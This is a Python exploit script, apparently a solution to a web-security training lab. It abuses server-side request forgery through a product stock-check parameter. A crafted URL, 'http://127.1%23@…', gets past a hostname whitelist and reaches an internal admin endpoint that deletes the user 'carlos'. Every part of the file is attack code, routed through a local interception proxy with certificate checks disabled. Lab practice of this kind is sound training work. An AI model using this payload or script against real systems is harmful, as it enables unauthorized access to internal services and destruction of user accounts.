import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def SSRF_admin(url):
    parameter = '/product/stock'
    payload_parameter = 'http://127.1%23@stock.weliketoshop.net/admin/delete?username=carlos'
    payload = {'stockApi': payload_parameter}
    r = requests.post(url + parameter, data=payload, verify=False, proxies=proxies)
    print("[+] Deleting Carlos' Account...")
    return True

def Check_carlos(url):
    SSRF_admin(url)
    parameter = '/product/stock'
    payload_parameter = 'http://127.1%23@stock.weliketoshop.net/admin'
    payload= {'stockApi': payload_parameter}
    r = requests.post(url + parameter, data=payload, verify=False, proxies=proxies)
    if 'User deleted successfully!' in r.text:
        print('[+] Carlos Deleted!')

def main():
    if len(sys.argv) !=2:
        print("[-]Usage : %s <url> " % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Looking for admin account...")
    Check_carlos(url)


if __name__ == "__main__":
    main ()